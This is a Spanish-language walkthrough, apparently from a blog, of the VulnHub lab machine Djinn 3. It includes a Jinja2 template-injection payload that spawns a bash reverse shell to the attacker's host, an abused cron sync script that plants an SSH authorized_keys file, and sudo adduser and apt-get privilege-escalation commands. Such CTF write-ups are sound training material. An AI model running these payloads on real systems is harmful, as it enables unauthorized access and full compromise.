---
layout: single
title: Djinn 3 - VulnHub
excerpt: " Intermediate level machine. The objective is to obtain the root flag. An SSTI is handled and there is Python code analysis involved."
date: 2023-03-28
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-djinn/djinn.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - Python
  - SSTI
  - Jinja2
  - Cron
  - Json
  - Netcat
---

Intermediate level machine. The objective is to obtain the root flag. An SSTI is handled and there is Python code analysis involved.
<br><br>
# Summary
- IP: 192.168.1.51
- Ports: 22,80,5000,31337
- OS: Linux
- Services & Applications:
	-  80 -> Apache httpd 2.4.29

# Recon

- Escaneo básico de puertos:  

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.51 -oG allPorts
```


- Escaneo profundo de puertos encontrados:  

```bash
$nmap -p22,80,5000,31337 -sCV 192.168.1.51 -oN targeted
```

<br><br>
# Análisis de página web (Port 5000):


- Al abrir la página nos encontramos con una tabla de 5 columnas con información dentro de sus respectivos campos; se tratan de `tickets` que contienen diversas peticiones hechas al personal, nos fijamos especialmente en el ticket que contiene como descripción "Remove default user guest from the ticket creation service.".

- Deducimos que existe o existía un usuario predeterminado `"guest"`.


<br><br>
# Análisis de puerto 31337:

- Ya que en el análisis con nmap no nos reportó ningún servicio específico con este puerto, de forma manual intentaremos primero entablar una conexión con netcat:

```bash
$nc 192.168.1.51 31337

username> 
password> 
```

- Vemos que si se hace la conexión y nos pide un usuario y una contraseña, como habíamos deducido antes que existía o existe un usuario `"guest"`, intentamos acceder con el usuario "guest" y contraseña "guest".

- Ya dentro, podemos darnos cuenta en qué consiste este sistema:

```js
Welcome to our own ticketing system. This application is still under 
development so if you find any issue please report it to mail@mzfr.me

Enter "help" to get the list of available commands.

> help

        help        Show this menu
        update      Update the ticketing software
        open        Open a new ticket
        close       Close an existing ticket
        exit        Exit
```

- Al parecer desde este puerto con la conexión establecida podemos manipular la información que se muestra en la página que vimos en el puerto 5000; sabiendo esto sospechamos de un SSTI así que hacemos la prueba:

<br><br>
# Server Side Template Injection (SSTI) Jinja2:

Referencia de SSTI Jinja2: [Jinja2 SSTI - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

- Como en el informe de NMAP desubrimos que `Python` está corriendo por detrás, vamos a colar lineas que afecten a administradores de templates de Python, comenzando por Jinja2 que suele ser el más común; para esto, en la linea de comandos elegimos la opción "open", y como título y descripción le agregamos la inyección:

```js
{{///7*7///}} *borrar triple slash (///)
```

- Damos ENTER y comprobamos en la página web que se nos interprete esta operatoria, en caso de mostrarse el "49" significaría que sí que es vulverable a `SSTI`.

- De primeras en la página principal vemos que no se nos interpreta el título, pero si accedemos al ticket mediante el campo de "link" podemos observar que efectivamente en el título y en la descripción del ticket se nos muestra el "49".

- Teniendo presente un SSTI lo usaremos para ganar acceso al sistema montándonos una `reverse shell` creando otro ticket que contenga la siguiente inyección:

```bash
----------->"""{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/192.168.1.35/443 0>&1'").read()}}{%endif%}{% endfor %}"""
```

- Habiendo hecho esto estando en escucha en nuestra máquina atacante ganaremos acceso al sistema como el usuario `"www-data"`.


<br><br>

# ESCALANDO PRIVILEGIOS:

- Hacemos un análisis con pspy y encontramos lo siguiente:

```js
2023/03/29 00:45:01 CMD: UID=1000  PID=1512   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2023/03/29 00:45:01 CMD: UID=1000  PID=1511   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2023/03/29 00:45:01 CMD: UID=0     PID=1510   | /usr/sbin/CRON -f 
2023/03/29 00:45:01 CMD: UID=1000  PID=1514   | /usr/bin/python3 /home/saint/.sync-data/syncer.py 
```

- Como vemos, se está ejecutando automáticamente la script en python `"syncer.py"`, si hacemos una búsqueda en el sistema, encontramos en el directorio "/opt" varios archivos y directorios ocultos, en los que encontramos dos archivos interesantes: ".configuration.cpython-38.pyc" y ".syncer.cpython-38.pyc"; se tratan de dos archivos compilados de python.

- Notamos que el segundo archivo (.syncer.cpython-38.pyc) tiene casi el mismo nombre del archivo que vimos que se está ejecutando de forma automática cada cierto tiempo (/home/saint/.sync-data/syncer.py) así que podríamos deducir que se trata de una clase de copia o backup del mismo, y dado que tenemos acceso de lectura lo podremos analizar.

# Análisis de código Python:

- Primero, transferimos los dos archivos ocultos que encontramos a nuestra máquina atacante.

- Luego los `decompilamos` usando la librería `"uncompyle6"` de Python para poder leer el código sin problema:

```bash
$uncompyle6 .syncer.cpython-38.pyc > syncer.py
$uncompyle6 .configuration.cpython-38.pyc > syncer.py
```

- Con los archivos ".py" creados podremos leer sin problema qué hace cada código, hacemos un análisis profundo y sacamos las siguiente conclusiones:

1. Estos dos archivos de Python trabajan juntos para realizar una tarea de sincronización de datos a través de diferentes tipos de conexiones como FTP, SSH, y URL.

2. El primer archivo, "configuration.cpython-38.py", contiene una clase llamada "ConfigReader" con dos métodos estáticos: "read_config" y "set_config_path". El método "read_config" lee un archivo de configuración en formato JSON y devuelve un diccionario de valores de configuración. El método "set_config_path" busca archivos de configuración JSON en dos rutas diferentes y selecciona el archivo más reciente para su uso.

3. El segundo archivo, "syncer.cpython-38.py", importa la clase "ConfigReader" del primer archivo y también importa tres módulos de conectores: "ftpconn", "sshconn", y "utils". La función principal "main" usa el método "set_config_path" de la clase "ConfigReader" para obtener la ruta del archivo de configuración y luego usa el método "read_config" para leer los valores de configuración.

4. Después de obtener los valores de configuración, la función "checker" del módulo "utils" se llama para determinar qué tipos de conexiones están disponibles según los valores de configuración. Si hay una conexión FTP disponible, se llama a la función "ftpcon" del módulo "ftpconn", si hay una conexión SSH disponible, se llama a la función "sshcon" del módulo "sshconn", y si hay una `URL disponible`, se llama a la función `"sync"` del módulo "utils".

5. El archivo de configuración en formato JSON que puede ser aceptado por esta aplicación `debe llamarse` "config.json". El archivo debe estar ubicado en una de las dos rutas que se especifican en el método "set_config_path" de la clase "ConfigReader" en el archivo "configuration.cpython-38.py". Estas dos rutas son `"/home/saint/" y "/tmp/"`.

6. El parámetro `"output"` en la línea `sync(config['URL'], config['Output'])` indica la ruta de salida donde se `almacenará el archivo descargado de la URL especificada`. La función "sync" en el módulo "utils" `descarga los datos de la URL especificada` y los almacena en la `ruta de salida especificada` en la clave "Output" del archivo de configuración JSON.

7. En el código del primer archivo de Python ("configuration.cpython-38.py"), se puede ver que se están realizando `validaciones de fecha para determinar cuál de los archivos de configuración con extensión` ".json" en el directorio "/home/saint/" y "/tmp/" es el más reciente. Por lo tanto, si está utilizando esta funcionalidad para determinar qué archivo de configuración utilizar, es importante asegurarse de que el archivo de configuración tenga un nombre que `incluya la fecha en el formato "dd-mm-yyyy"`.

8. En el código proporcionado, se puede ver que el primer archivo de Python espera que los archivos de configuración JSON tengan el siguiente formato: `"dd-mm-yyyy.config.json"`. Por lo tanto, si desea que su archivo de configuración sea aceptado por esta aplicación, deberá seguir este `formato en el nombre` del archivo.


- Sabiendo todo esto, tenemos claro que tenemos la capacidad de crear en el directorio "/tmp" un arhivo de configuración en formato JSON que realizará una de las 3 funcionalidades que ofrece la script (FTP,SSH y URL), en este caso, nos aprovecharemos de una URL ya que vimos que la script descarga datos de una URL específica y los almacena en un directorio que podremos manipular ya que que forma parte de la estructura JSON (Output).

- ¿Pero qué vamos a descargar? se preguntarán, y es válida la cuestión; en la fase de reconocimiento vimos que está abierto el puerto 22 (SSH) así que podemos suponer que existe un directorio ".ssh" en cada usuario del sistema; lo que haremos es almacenar un archivo "authorized_keys" dentro del directorio "/home/saint/.ssh/" que contenga uan clave pública generada por nuestro usuario del sistema de nuestra máquina atacante con la finalidad de tener acceso SSH a la máquina atacante como el usuario "saint" sin proporcionar contraseña.

- Primero creamos la clave pública en nuestra máquina atacante:

```bash
$ssh-keygen

ENTER
ENTER
ENTER
```

- Ahora, nos dirigemos al directorio en el que se generó la `clave pública SSH` (en mi caso siendo el usuario root) y creamos un servidor simple con python para que la máquina víctima tenga acceso a este archivo.

```bash
$python3 -m http.server 80
```

- Entonces, en el directorio "/tmp" de la máquina víctima nos creamos un archivo llamado `"23-12-2022.config.json"` (Habiendo analizado el punto 7 de las conclusiones) con el siguiente contenido json:

```bash
$nano 23-12-2022.config.json
```


```json
{
	"URL":"http://192.168.1.35/id_rsa.pub",
	"Output":"/home/saint/.ssh/authorized_keys"
}
```

- Ahora esperamos a que se ejecute la script en segundo plano que habíamos visto en el `pspy` y se descargará nuestro archivo "id_rsa.pub" en la máquina atacante y se almacenará en el directorio "/home/saint/.ssh/authorized_keys"; lo podemos confirmar viendo la petición GET recibida en nuestro servidor de python.


- Cuando veamos que se haya descargado nuestro archivo, podremos acceder por SSH desde nuestra máquina atacante como el usuario `"saint"` sin contraseña:

```bash
$ssh saint@192.168.1.51
```

- Siendo el usuario "saint" revisamos permisos de `sudoers` y vemos lo siguiente:

```js
User saint may run the following commands on djinn3:
    (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
```

- Es decir que podemos ejecutar el binario "adduser" como root sin contraseña, exceptuando la creación de usuarios "sudo" y "admin".

- Esto lo podemos aprovechar creando un usuario "pwned" pero usando el parámetro `"-gi"` para asignarle identificador de grupo `"0"` el cual pertenece al grupo `"root"`:

```bash
$sudo adduser pwned -gi=0
```

- Ahora pivotamos a este usuario "pwned" y como pertenecemos al `grupo "root"` tendremos la capacidad de leer ciertos archivos pertenecientes a root; en este caso, revisamos el archivo "/etc/sudoers" en busca de permisos no contemplados siendo usuario saint, y encontramos la siguiente linea:

```js
jason ALL=(root) PASSWD: /usr/bin/apt-get
```

- Es decir, el usuario `"jason"` puede ejecutar como root sin contraseña el binario "apt-get"; si revisamos la máquina, no encontramos ningún usuario "jason", así que regresamos al usuario "saint" y aprovechamos de nuevo el binario "adduser" para crear un usuario "jason":

```bash
$sudo adduser jason
```


- Pivotamos al usuario jason que hemos creado y buscamos una forma de escalar privilegios usando el binario `"apt-get"`, encontramos lo siguiente [apt get | GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/#sudo):

- Ejecutamos los comandos proporcionados y seremos `root`:

```js
TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt-get install -c $TF sl
```
